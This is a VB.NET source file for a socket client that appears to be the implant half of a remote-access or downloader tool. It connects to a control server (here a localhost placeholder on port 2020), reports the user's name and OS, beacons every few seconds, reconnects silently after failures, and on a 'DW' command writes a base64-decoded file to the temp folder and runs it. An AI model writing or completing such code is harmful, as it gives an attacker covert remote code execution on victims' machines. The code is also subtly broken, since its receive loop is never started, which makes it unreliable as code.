Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Public Class ClientSocket

    Public Shared S As Socket
    Public Shared Buffer(999999) As Byte
    Public Shared MS As New MemoryStream

    Public Shared EOF As String = "<EOF>"
    Public Shared SPL As String = "<N>"

    Public Shared isConnected As Boolean = False


    Public Shared Sub BeginConnect()

        Try
            Threading.Thread.Sleep(1000)
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)

            Buffer = New Byte(999999) {}
            MS = New MemoryStream

            S.Connect(ipEndPoint)

            isConnected = True

            Dim OS As New Devices.ComputerInfo
            Send(String.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName))

            While isConnected
                Threading.Thread.Sleep(5000)
                Send("e")
            End While

        Catch ex As Exception
            Disconnected()
        End Try

    End Sub

    Private Shared Sub BeginReceive(ByVal ar As IAsyncResult)
        Try
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
        Catch ex As Exception
        End Try
    End Sub


    Private Shared Sub EndReceive(ByVal ar As IAsyncResult)
        Try
            S = ar.AsyncState
            Dim Received As Integer = S.EndReceive(ar)
            If Received > 0 Then
                MS.Write(Buffer, 0, Received)
                If BS(MS.ToArray).Contains(EOF) Then

                    Dim T As New Threading.Thread(AddressOf Read)
                    T.Start(MS.ToArray)

                    MS.Flush()
                    MS.Dispose()
                    MS = New MemoryStream
                    Buffer = New Byte(999999) {}
                End If
            End If
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Read(ByVal b As Byte())
        Try
            Dim A As String() = Split(BS(b).Replace(EOF, Nothing), SPL)
            Select Case A(0)
                Case "CLOSE"
                    Environment.Exit(0)

                Case "DW"
                    Dim NewFile = Path.GetTempFileName + A(1)
                    File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                    Threading.Thread.Sleep(500)
                    Diagnostics.Process.Start(NewFile)
            End Select
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Send(ByVal msg As String)
        Try
            Using M As New MemoryStream
                M.Write(SB(msg), 0, msg.Length)
                M.Write(SB(EOF), 0, EOF.Length)
                S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
                M.Flush()
                M.Dispose()
            End Using
        Catch ex As Exception
            Disconnected()
        End Try
    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)
        Try
            S.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Disconnected()
        isConnected = False

        Try
            If S IsNot Nothing Then
                S.Close()
                S.Dispose()
                S = Nothing
            End If
        Catch ex As Exception
        End Try

        Try
            If MS IsNot Nothing Then
                MS.Dispose()
                MS = Nothing
            End If
        Catch ex As Exception
        End Try

        BeginConnect()

    End Sub


End Class
